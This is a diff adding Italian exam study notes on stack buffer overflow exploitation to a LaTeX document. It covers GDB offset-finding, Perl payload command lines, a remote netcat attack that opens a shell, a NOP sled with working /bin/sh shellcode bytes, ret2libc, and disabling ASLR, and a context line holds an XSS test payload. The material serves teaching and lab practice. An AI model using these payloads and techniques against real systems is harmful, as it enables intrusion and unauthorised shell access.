@@ -935,4 +935,181 @@
 		${alert(document.domain)}
 	\end{lstlisting}
 	
+	\section{Binary Exploits (Stack-Based Buffer Overflow)}
+	
+	\subsection{Introduzione e Concetti Base}
+	Un buffer overflow si verifica quando i dati inseriti in un buffer superano la sua capacità allocata, andando a sovrascrivere la memoria adiacente. Sfruttando questa vulnerabilità e scrivendo dati mirati, è possibile sovrascrivere gli indirizzi di ritorno e dirottare il flusso di esecuzione del programma verso codice arbitrario.	\\\\
+	Durante l'esecuzione, lo Stack (che contiene variabili locali e record di attivazione) cresce verso indirizzi di memoria decrescenti (verso il basso), mentre i buffer vengono riempiti verso indirizzi crescenti. Questa direzione opposta è il fulcro della vulnerabilità.
+	
+	\begin{nota}[Controllo ASLR]
+		L'ASLR (Address Space Layout Randomization) randomizza gli indirizzi di memoria per prevenire questi attacchi. Prima di testare un exploit in laboratorio, verifica se è attivo con il comando:
+		\begin{lstlisting}[language=bash]
+			cat /proc/sys/kernel/randomize_va_space
+		\end{lstlisting}
+		Se il valore restituito è 1 o 2, l'ASLR è attivo e l'exploit fallirà. Per disabilitarlo: \texttt{echo 0 > /proc/sys/kernel/randomize\_va\_space}.
+	\end{nota}
+	
+	\subsection{Registri CPU essenziali ed Endianness}
+	Ai fini dell'esame e dell'exploitation pratica, i registri a 32 bit fondamentali dell'architettura Intel IA32 da tenere a mente sono tre:
+	\begin{itemize}
+		\item \textbf{EIP (Instruction Pointer):} Contiene l'indirizzo della successiva istruzione che la CPU deve eseguire. È il nostro bersaglio principale.
+		\item \textbf{ESP (Stack Pointer):} Punta sempre alla cima attuale dello stack (l'indirizzo più basso occupato).
+		\item \textbf{EBP (Base Pointer):} Punta alla base del frame corrente dello stack e serve come riferimento per le variabili locali.
+	\end{itemize}
+	\textbf{Little-Endian:}\\
+	L'architettura Intel IA32 utilizza la rappresentazione in memoria \textit{Little-Endian}, il che significa che i byte meno significativi vengono memorizzati per primi (agli indirizzi più bassi). 
+	A livello pratico per l'esame: tutti gli indirizzi di memoria da iniettare nei payload vanno scritti invertendo l'ordine dei byte. Ad esempio, l'indirizzo \texttt{0x42434445} diventerà \texttt{\textbackslash x45\textbackslash x44\textbackslash x43\textbackslash x42}.
+	
+	\subsection{Strumenti Operativi: GDB e Perl}
+	
+	Il debugger GDB è lo strumento principale per analizzare il comportamento della memoria durante il crash. Di seguito i comandi vitali per risolvere gli esercizi:
+	\begin{itemize}
+		\item \texttt{b *main} oppure \texttt{break nome\_funzione} $\rightarrow$ Inserisce un breakpoint alla funzione specificata.
+		\item \texttt{run} $\rightarrow$ Esegue il programma (può prendere in input stringhe o script).
+		\item \texttt{x/200xw \$esp} $\rightarrow$ Ispeziona la memoria stampando 200 "word" in formato esadecimale a partire dalla posizione attuale di ESP.
+		\item \texttt{p system} / \texttt{p exit} $\rightarrow$ Stampa l'indirizzo di memoria delle funzioni specificate.
+		\item \texttt{info functions} $\rightarrow$ Mostra lo spazio di indirizzamento e l'indirizzo reale delle funzioni caricate.
+	\end{itemize}
+	\textbf{Generazione Payload con Perl:}\\
+	Per passare comodamente byte "grezzi" (raw) o lunghe sequenze di caratteri al programma vulnerabile, si utilizza Perl direttamente da riga di comando (spesso combinato con \texttt{run} in GDB):
+	\begin{lstlisting}[language=bash]
+		# Genera una stringa di 100 'A'
+		$(perl -e 'print "A"x100')
+	\end{lstlisting}
+	Questo approccio è essenziale per generare velocemente il padding e concatenare gli indirizzi formattati in hex.
+	
+	\subsection{Metodologia di Exploitation}
+	Per prendere il controllo del registro EIP, è necessario determinare l'esatto \textit{offset}, ovvero il numero preciso di byte di padding richiesti per sovrascrivere l'EBP salvato prima di raggiungere l'indirizzo di ritorno. \\\\
+	In sede d'esame, in mancanza di script esterni, questo calcolo si effettua empiricamente sfruttando il metodo della \textbf{bisezione}:
+	\begin{enumerate}
+		\item Si inviano inizialmente input di lunghezza progressivamente crescente (es. grandi blocchi di caratteri "A") fino a forzare il programma al crash per errore di segmentazione (\textit{Segmentation Fault}).
+		\item Si analizza lo stato dei registri in GDB al momento del blocco. Se l'EIP mostra il valore \texttt{0x41414141} (corrispondente ad "AAAA"), significa che il buffer è stato completamente saturato ed è stato superato l'indirizzo di ritorno.
+		\item Si riduce l'intervallo affinando la stringa e sostituendo gli ultimi 4 byte critici del blocco stimato con caratteri differenti (es. "BBBB"). Nel momento in quali GDB mostrerà il crash esatto sull'indirizzo \texttt{0x42424242} (corrispondente alle "B"), sapremo di aver isolato al singolo byte la misura esatta del padding necessario per controllare l'EIP.
+	\end{enumerate}
+	
+	\subsection{Scenari d'Esame}
+	
+	\subsubsection{Scenario 1: Sovrascrivere una variabile di controllo (write\_var)}
+	\textbf{Contesto e Obiettivo:} Il programma non deve aprire una shell, ma semplicemente stampare una flag nascosta. Per farlo, richiede che una variabile locale (dichiarata nel codice subito dopo il buffer) assuma un valore esatto per superare un controllo \texttt{if}. Noi sborderemo dal buffer per sovrascrivere proprio quella variabile.
+	
+	\begin{enumerate}
+		\item \textbf{Fase 1: Determinare il Padding (Offset)}
+		Dobbiamo capire quanti caratteri inserire prima di arrivare a "toccare" la variabile. Abbiamo due metodi:
+		\begin{itemize}
+			\item \textbf{Metodo Universale (Bisezione):} Se non conosciamo i nomi delle variabili o non abbiamo i simboli di debug, andiamo per tentativi procedendo a blocchi (es. inviando "A"x100). Incrementiamo finché il valore stampato dal programma (che ci avvisa "control is now...") non cambia, oppure finché non andiamo a sovrascrivere ciò che non dovremmo.
+			\item \textbf{Metodo GDB (Se abbiamo il codice):} Se GDB riconosce le variabili locali, basta fermarsi con un breakpoint e calcolare la distanza matematica:
+			\begin{lstlisting}[language=bash]
+				(gdb) p &buffer                   # Es: 0xbffff000
+				(gdb) p &target_variable          # Es: 0xbffff068
+				# Differenza = 0x68 (104 byte di padding)
+			\end{lstlisting}
+		\end{itemize}
+		
+		\item \textbf{Fase 2: Struttura del Payload e Iniezione}
+		Identificato il valore richiesto dall' \texttt{if} (es. \texttt{0x45444342}), si inserisce il padding e si concatena il valore convertito in Little-Endian (\texttt{\textbackslash x42\textbackslash x43\textbackslash x44\textbackslash x45}):
+		\begin{lstlisting}[language=bash]
+			./vulnerable_binary $(perl -e 'print "A"x[OFFSET] . "\x42\x43\x44\x45"')
+		\end{lstlisting}
+	\end{enumerate}
+	
+	\subsubsection{Scenario 2: Esecuzione di funzioni nascoste (secret\_function)}
+	\textbf{Contesto e Obiettivo:} Il programma alloca una \texttt{struct} in memoria che contiene prima un buffer e poi un \textit{function pointer} (un puntatore che indica alla CPU quale funzione eseguire). Questo puntatore richiama normalmente una funzione lecita. Il nostro obiettivo è "sbrodolare" dal buffer per sovrascrivere il puntatore, sostituendolo con l'indirizzo di una funzione "segreta" presente nel codice ma mai richiamata.
+	
+	\begin{enumerate}
+		\item \textbf{Fase 1: Trovare l'indirizzo della funzione segreta}
+		È sufficiente aprire GDB e chiedere la lista di tutte le funzioni caricate in memoria e i relativi indirizzi. 
+		\begin{lstlisting}[language=bash]
+			(gdb) info functions              # Cerca nell'elenco la funzione segreta
+		\end{lstlisting}
+		\textit{Nota:} GDB mostrerà direttamente l'indirizzo (es. \texttt{0x565561b9}). Il comando \texttt{p nome\_funzione} si usa solo in alternativa se la lista è troppo lunga e si vuole filtrare.
+		
+		\item \textbf{Fase 2: Calcolo Offset e Iniezione}
+		Trovato l'offset del buffer tramite la solita bisezione (tentativi con lunghezze crescenti), si inverte l'indirizzo trovato al passo 1 in formato Little-Endian e lo si accoda al padding:
+		\begin{lstlisting}[language=bash]
+			./vulnerable_binary $(perl -e 'print "A"x[OFFSET] . "\xb9\x61\x55\x56"')
+		\end{lstlisting}
+	\end{enumerate}
+	
+	\subsubsection{Scenario 2.1: Variante Remota e Reverse Shell}
+	\textbf{Contesto e Obiettivo:} In questo scenario stiamo attaccando un server remoto (esposto in rete tramite Netcat) e non un eseguibile lanciato sul nostro terminale locale. Se il nostro exploit ha successo, il server remoto farà "spawnare" una bash. Tuttavia abbiamo un grosso problema: se usiamo il comando standard \texttt{perl | nc}, non appena Perl finisce di stampare il nostro payload, \textbf{lo standard input (il "tubo" della pipe) si chiude}. Questo causa la chiusura immediata e automatica della bash appena aperta, vanificando l'attacco. 
+	L'obiettivo è quindi trovare un modo per mantenere \textbf{aperto e interattivo} questo canale.
+	
+	\begin{enumerate}
+		\item \textbf{La Soluzione (Il Trick di Cat):} Per evitare che il canale si chiuda, raggruppiamo l'esecuzione di Perl all'interno di parentesi graffe e concateniamo il comando \texttt{cat} lanciato senza argomenti. \texttt{cat} resterà in attesa infinita del nostro input da tastiera, mantenendo viva la pipe.
+		\item \textbf{Comando d'Esame:}
+		\begin{lstlisting}[language=bash]
+			{ perl -e 'print "A"x[OFFSET] . "\xb9\x61\x55\x56"'; cat; } | nc [IP_TARGET] [PORTA]
+		\end{lstlisting}
+		\textit{Nota pratica:} Dopo l'esecuzione, il terminale sembrerà totalmente bloccato. In realtà sei dentro! Premi Invio e prova a digitare i comandi di shell (es. \texttt{ls}, \texttt{whoami}).
+	\end{enumerate}
+	
+	\subsubsection{Scenario 3: Buffer Overflow con Shellcode e NOP Sled}
+	\textbf{Contesto e Obiettivo:} Il programma non contiene funzioni "utili" pre-scritte da richiamare. Dobbiamo quindi essere noi a iniettare del vero e proprio codice macchina malevolo (\textit{shellcode}) all'interno dello stack, per poi costringere l'EIP a saltarci sopra. Poiché è difficilissimo azzeccare al singolo byte l'indirizzo esatto in cui inizierà il nostro shellcode, usiamo una \textbf{NOP Sled} (slitta di NOP). L'istruzione NOP (\texttt{\textbackslash x90}) dice alla CPU "non fare nulla e passa alla successiva". Se noi riempiamo lo stack di NOP prima dello shellcode, ci basterà mirare "nel mucchio": la CPU atterrerà in mezzo ai NOP e "scivolerà" fino allo shellcode.
+	
+	\begin{enumerate}
+		\item \textbf{Fase 1: Calcolo dei Componenti del Payload}
+		Troviamo prima di tutto l'offset totale necessario per mandare in crash l'EIP tramite bisezione (mettiamo caso sia 200 byte). 
+		I nostri dati sono due:
+		\begin{itemize}
+			\item L'Offset totale (es. 200 byte).
+			\item La lunghezza dello shellcode che vogliamo iniettare (es. 50 byte).
+		\end{itemize}
+		La NOP Sled occuperà tutto lo spazio rimanente: $200 - 50 = 150$ byte di NOP (\texttt{\textbackslash x90}). Il Payload sarà strutturato così: \texttt{[150 byte NOP] + [50 byte Shellcode] + [4 byte EIP]}.
+		
+		\item \textbf{Fase 2: Individuazione dell'Indirizzo di Atterraggio}
+		Per trovare l'indirizzo da mettere nell'EIP, mandiamo un payload pieno di soli NOP per test:
+		\begin{lstlisting}[language=bash]
+			(gdb) run $(perl -e 'print "\x90"x200')     # Genera un crash riempiendo lo stack
+			(gdb) x/100xw $esp                         # Esamina la memoria intorno a ESP
+		\end{lstlisting}
+		Visivamente, cerchiamo il blocco di \texttt{0x90909090} stampati a schermo e ne peschiamo un indirizzo situato \textbf{più o meno al centro} (es. \texttt{0xffffd64c}).
+		
+		\item \textbf{Fase 3: Comando Finale}
+		Inseriamo l'indirizzo scelto (in Little-Endian) a chiusura del nostro payload:
+		\begin{lstlisting}[language=bash]
+			./vulnerable_binary $(perl -e 'print "\x90"x150 . "[SHELLCODE_DI_50_BYTE]" . "\x4c\xd6\xff\xff"')
+		\end{lstlisting}
+		\begin{nota}[Shellcode Standard d'Esame per \texttt{/bin/sh}]
+			All'esame, se non fornito, il payload a 32-bit (senza bad characters) per lanciare una shell locale è: \texttt{\textbackslash x31\textbackslash xc0\textbackslash x50\textbackslash x68\textbackslash x2f\textbackslash x2f\textbackslash x73\textbackslash x68\textbackslash x68\textbackslash x2f\textbackslash x62\textbackslash x69\textbackslash x6e\textbackslash x89\textbackslash xe3\textbackslash x50\\\textbackslash x53\textbackslash x89\textbackslash xe1\textbackslash xb0\textbackslash x0b\textbackslash xcd\textbackslash x80}
+		\end{nota}
+	\end{enumerate}
+	
+	\subsubsection{Scenario 4: Bypass NX Stack (Return to Libc)}
+	\textbf{Contesto e Obiettivo:} Se lo stack è protetto dal bit NX (Non-Eseguibile), l'iniezione di shellcode fallisce e la CPU va in blocco. Per aggirare questa protezione si ricorre alla tecnica \textit{Ret2Libc}, che riutilizza funzioni già caricate legittimamente in memoria della libreria standard C (\texttt{libc}). Falsificheremo uno \textit{Stack Frame} valido per forzare il programma a invocare la funzione \texttt{system()} (\textit{funzione che esegue comandi di sistema}) passandole come argomento la stringa \texttt{"/bin/sh"} (\textit{il percorso per istanziare una shell}), per poi reindirizzare la chiusura sulla funzione \texttt{exit()} (\textit{funzione che termina il processo in modo pulito ed evita crash sospetti nei log}).
+	
+	\begin{enumerate}
+		\item \textbf{Fase 1: Raccolta dei Tre Indirizzi Chiave in GDB}
+		Estrarre la posizione esatta in memoria dei tre componenti fondamentali:
+		\begin{lstlisting}[language=bash]
+			(gdb) b main
+			(gdb) run
+			(gdb) p system                # 1. Trova l'indirizzo di system()
+			(gdb) p exit                  # 2. Trova l'indirizzo di exit()
+			(gdb) x/500s $esp             # 3. Cerca la stringa "/bin/sh" nelle var. d'ambiente
+		\end{lstlisting}
+		\textit{Se \texttt{x/500s \$esp} fallisce:} usa \texttt{find \&system, +9999999, "/bin/sh"} per cercarla direttamente nei segmenti mappati della libreria.
+		
+		\item \textbf{Fase 2: Regola dello Stack Frame (Perché \texttt{exit} va PRIMA di \texttt{/bin/sh}?)}
+		In architettura x86 a 32-bit (\textit{convenzione cdecl}), una funzione invocata si aspetta tassativamente lo stack organizzato secondo questa gerarchia hardware:
+		\begin{itemize}
+			\item Al top attuale dello stack (\texttt{ESP}) deve risiedere l'\textbf{Indirizzo di Ritorno} (dove la CPU salta quando la funzione termina).
+			\item Subito sotto (\texttt{ESP + 4}) deve risiedere il \textbf{Primo Argomento} della funzione.
+		\end{itemize}
+		Dato che noi saltiamo dentro \texttt{system()} sovrascrivendo l'EIP (sfruttando la \texttt{RET} del binario vulnerabile e non una regolare istruzione \texttt{CALL}), \texttt{system()} leggerà la memoria convinta che lo stack sia stato configurato normalmente. Dobbiamo quindi posizionare i dati nell'ordine esatto in cui l'hardware li andrà a cercare:
+		\begin{center}
+			\texttt{[Padding] + [ \&system ] + [ \&exit (Ritorno fittizio) ] + [ \&"/bin/sh" (Argomento) ]}
+		\end{center}
+		Se invertissimo l'ordine inserendo prima la stringa, \texttt{system()} cercherà erroneamente di interpretare l'indirizzo di \texttt{exit} come l'argomento stringa da eseguire, mandando l'exploit in fallimento.
+		
+		\item \textbf{Fase 3: Compilazione del Payload d'Esame}
+		Trovato l'offset dell'EIP tramite bisezione, concatenare i valori estratti in formato Little-Endian:
+		\begin{lstlisting}[language=bash]
+			./vulnerable_binary $(perl -e 'print "A"x[OFFSET_EIP] . "[LITTLE_ENDIAN_SYSTEM]" . "[LITTLE_ENDIAN_EXIT]" . "[LITTLE_ENDIAN_BINSH]"')
+		\end{lstlisting}
+	\end{enumerate}
+	
+	\subsection{Note a Margine: Shellcode e Bad Characters}
+	In sede d'esame lo shellcode da utilizzare viene generalmente fornito all'interno delle risorse o dei file di esercizio. Tuttavia, in contesti reali, i payload macchina vengono generati tramite tool come \texttt{msfvenom}.\\\\
+	Durante la costruzione del payload è fondamentale prestare attenzione ai cosiddetti \textbf{Bad Characters}. Alcuni caratteri speciali, primo fra tutti il \textit{Null Byte} (\texttt{\textbackslash x00}), ma a seconda dei casi anche il \textit{Line Feed} (\texttt{\textbackslash x0A}) o il \textit{Carriage Return} (\texttt{\textbackslash x0D}), vengono interpretati dalle funzioni di lettura stringhe (come \texttt{strcpy} o \texttt{gets}) come indicatori di fine stringa. Se lo shellcode o il padding contenessero uno di questi byte, la lettura dell'input verrebbe interrotta prematuramente a metà, invalidando l'intero attacco di overflow.
+	
 \end{document}
